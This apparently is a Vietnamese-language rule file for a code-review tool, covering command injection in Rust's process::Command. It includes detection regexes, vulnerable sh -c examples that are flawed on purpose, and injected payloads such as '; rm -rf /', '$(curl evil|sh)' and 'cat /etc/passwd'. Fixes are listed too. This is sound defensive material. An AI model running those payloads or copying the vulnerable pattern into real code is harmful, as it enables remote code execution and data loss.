---
id: COMMAND-INJECTION
severity_max: CRITICAL
applies_to: rust
---

# Command Injection (Rust)

## Intent

Rust `std::process::Command` truyền **argv list** nên an toàn theo mặc định — `Command::new("convert").arg(user_file)` KHÔNG qua shell, `user_file` chỉ là một arg. Lỗ hổng xuất hiện khi vibe code **cố tình gọi shell**: `Command::new("sh").arg("-c").arg(user_cmd)` hoặc `.arg(format!("convert {}", user_file))` rồi đưa vào `sh -c`. Lúc đó L1 input được shell diễn giải → RCE (`; rm -rf /`, `$(curl evil|sh)`).

## Khi nào CRITICAL

- `Command::new("sh"|"bash"|"cmd"|"powershell").arg("-c"|"/C").arg(<chứa L1>)`
- `.arg(format!("... {}", user_input))` khi chương trình là shell
- `tokio::process::Command` tương tự
- Crate wrapper chạy lệnh từ string (vd build command từ `format!` rồi split sai)

## Khi nào HIGH (giảm cấp)

- User input qua whitelist (`matches!(action, "start"|"stop")`) trước khi vào arg
- Lệnh internal CLI tool không expose ra internet
- Có `shell-escape`/quoting đúng nhưng vẫn `sh -c` (vẫn khuyến nghị bỏ shell)

## Cách reasoning (KHÔNG pattern-match thuần)

1. **Grep**: `Command::new`, `.arg(`, `.args(`, `sh"`, `-c"`, `tokio::process`.
2. **Read**: chương trình chạy là gì? `sh`/`bash`/`cmd` + `-c` với input động → nguy hiểm. Một binary cụ thể + argv list → an toàn.
3. **Trace** arg động về L1 (extractor, `req`, multipart filename).
4. **Verify**: argv list riêng từng phần (an toàn) hay 1 chuỗi shell đã ghép (nguy hiểm)?

## Search patterns (Rust-specific)

```
Command::new\s*\(\s*"(sh|bash|cmd|powershell|zsh)"
\.arg\s*\(\s*"-c"\s*\)
\.arg\s*\(\s*&?format!
\.args\s*\(\s*&?\[[^\]]*format!
tokio::process::Command
```

## Examples

### CRITICAL — flag

```rust
// axum — sh -c với input động
async fn ping(Query(p): Query<Host>) -> impl IntoResponse {
    let out = std::process::Command::new("sh")
        .arg("-c")
        .arg(format!("ping -c 1 {}", p.host)) // L1 → "8.8.8.8; cat /etc/passwd"
        .output().unwrap();                    // RCE
    String::from_utf8_lossy(&out.stdout).into_owned()
}
```

```rust
// build command string rồi sh -c
let cmd = format!("convert {} out.png", user_file); // L1
tokio::process::Command::new("bash").arg("-c").arg(cmd).output().await?; // BAD
```

### NOT critical — safe

```rust
// argv list — KHÔNG qua shell; user_host chỉ là một arg, không bị diễn giải
std::process::Command::new("ping")
    .args(["-c", "1", &user_host])  // an toàn dù user_host = "8.8.8.8; rm -rf /"
    .output()?;
```

```rust
// Whitelist action trước khi chạy
let action = match req_action.as_str() {
    "start" | "stop" | "restart" => req_action.as_str(),
    _ => return Err(bad_request()),
};
Command::new("systemctl").args([action, "myservice"]).output()?;
```

## Fix recommendation

1. **Đừng dùng shell** — `Command::new("<binary>").args([...])` truyền argv list trực tiếp.
2. **Nếu bắt buộc shell** (cần pipe), validate/whitelist input và escape bằng crate `shell-escape`; tốt nhất tách thành nhiều `Command` nối qua `Stdio`.
3. **Whitelist input** thành tập giá trị cố định trước khi truyền.
4. **Dùng thư viện thay vì shell**: image → crate `image`; HTTP → `reqwest`; nén → `flate2`.
5. **Least privilege**: process con chạy user thấp quyền; cân nhắc sandbox (seccomp/AppArmor).

## Cross-references

- Rule `10-path-traversal`: filename `../../bin/sh` kết hợp exec
- Rule `16-unrestricted-file-upload`: upload + exec = full RCE chain
- Rule `17-verbose-error-debug-mode`: stdout/stderr lệnh trả về client lộ thông tin
